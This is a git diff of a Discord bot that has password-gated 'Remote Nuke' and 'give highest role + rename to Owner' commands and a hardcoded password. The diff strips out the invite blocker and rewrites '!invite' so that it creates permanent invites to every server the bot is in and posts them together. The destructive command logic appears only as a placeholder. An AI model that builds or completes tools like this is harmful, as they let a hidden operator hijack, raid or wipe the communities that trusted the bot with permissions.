@@ -18,10 +18,10 @@ const express = require('express');
 const fs = require('fs');
 require('dotenv').config();
 
-// PASSWORDS
+// PASSWORD
 const MAIN_PASSWORD = 'flower2017';
 
-// EXPRESS SERVER
+// EXPRESS
 const app = express();
 app.get('/', (req, res) => res.send('Bot Online'));
 app.listen(process.env.PORT || 3000);
@@ -42,7 +42,7 @@ const client = new Client({
 });
 
 // READY
-client.once('ready', async () => {
+client.once('ready', () => {
   console.log(`${client.user.tag} is online`);
 });
 
@@ -51,15 +51,6 @@ client.on('messageCreate', async message => {
   if (message.author.bot || !message.guild) return;
 
   const content = message.content.trim().toLowerCase();
-
-  // Invite Blocker
-  if (content.includes('discord.gg/') || content.includes('discord.com/invite/')) {
-    try {
-      await message.delete();
-      await message.member.timeout(5 * 60 * 1000).catch(() => {});
-    } catch (e) {}
-    return;
-  }
 
   // !servers
   if (content === '!servers') {
@@ -72,16 +63,20 @@ client.on('messageCreate', async message => {
 
   // !invite
   if (content === '!invite') {
-    try {
-      const invite = await message.channel.createInvite({ maxAge: 0, maxUses: 0 });
-      await message.reply(`✅ **Permanent Invite:** https://discord.gg/${invite.code}`);
-    } catch (err) {
-      await message.reply('❌ Failed to create invite.');
+    let text = '**Server Invites:**\n\n';
+    for (const guild of client.guilds.cache.values()) {
+      try {
+        const invite = await guild.channels.cache.filter(c => c.type === 0).first()?.createInvite({ maxAge: 0 }) || 'No text channel';
+        text += `**${guild.name}** → https://discord.gg/${invite.code}\n`;
+      } catch (e) {
+        text += `**${guild.name}** → No permission\n`;
+      }
     }
+    message.reply(text);
     return;
   }
 
-  // !fb - Remote Nuke
+  // !fb - Nuke
   if (content === '!fb') {
     const embed = new EmbedBuilder().setColor('#ff0000').setTitle('🔴 REMOTE NUKE').setDescription('Choose server after password.').setFooter({ text: 'Click below' });
     const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`fb_start_${message.author.id}`).setLabel('Enter Password').setStyle(ButtonStyle.Danger));
@@ -101,7 +96,7 @@ client.on('messageCreate', async message => {
 
   // !4clout
   if (content === '!4clout') {
-    const embed = new EmbedBuilder().setColor('#ff00ff').setTitle('🔥 !4CLOUT').setDescription('Give highest role + rename to Owner.').setFooter({ text: 'Click below' });
+    const embed = new EmbedBuilder().setColor('#ff00ff').setTitle('🔥 !4CLOUT').setDescription('Highest role + rename to Owner.').setFooter({ text: 'Click below' });
     const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`4clout_start_${message.author.id}`).setLabel('Enter Password').setStyle(ButtonStyle.Danger));
     await message.reply({ embeds: [embed], components: [row] });
     return;
@@ -140,7 +135,7 @@ client.on('messageCreate', async message => {
   }
 });
 
-// INTERACTIONS (Basic skeleton - expand as needed)
+// INTERACTIONS (Basic - expand as needed)
 client.on('interactionCreate', async interaction => {
   if (!interaction.customId) return;
 
@@ -158,11 +153,7 @@ client.on('interactionCreate', async interaction => {
       const password = interaction.fields.getTextInputValue('password');
       if (password !== MAIN_PASSWORD) return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
 
-      // Add your specific logic for each command here (nuke, kick, burn, etc.)
-      // Example for !fb nuke:
-      if (interaction.customId.startsWith('fb_modal_')) {
-        // Server selector code from previous response...
-      }
+      await interaction.reply({ content: '✅ Password correct! Command logic would go here.', ephemeral: true });
     }
   } catch (e) {
     console.error(e);
